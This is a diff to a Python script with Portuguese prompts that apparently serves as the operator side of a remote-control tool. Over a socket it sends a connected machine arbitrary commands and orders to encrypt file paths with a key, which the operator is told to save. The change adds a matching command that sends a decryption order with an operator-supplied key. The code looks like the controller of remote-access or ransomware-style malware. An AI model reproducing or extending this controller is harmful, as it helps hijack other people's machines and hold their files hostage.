@@ -139,6 +139,12 @@ if __name__ == "__main__":
                             print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
                                                .format(cores['red'], cores['yellow'], encrypt_path, cores['red'], cores['green'], key))
                             conn.send(('cmdcryp' + encrypt_path + ':' + key).encode())
+                        elif data[5:10] == 'dcryp':
+                            decrypt_path = data[11:].strip()
+                            key = input('\n{}Digite a chave para descriptografar o caminho {}{}{} > {}{}'.format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], cores['yellow']))
+                            print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
+                                               .format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], key))
+                            conn.send(('cmddcryp' + decrypt_path + ':' + key).encode())
                         else:
                             # Se for comandos "normais"
                             conn.send(('cmd' + data[5:]).encode())
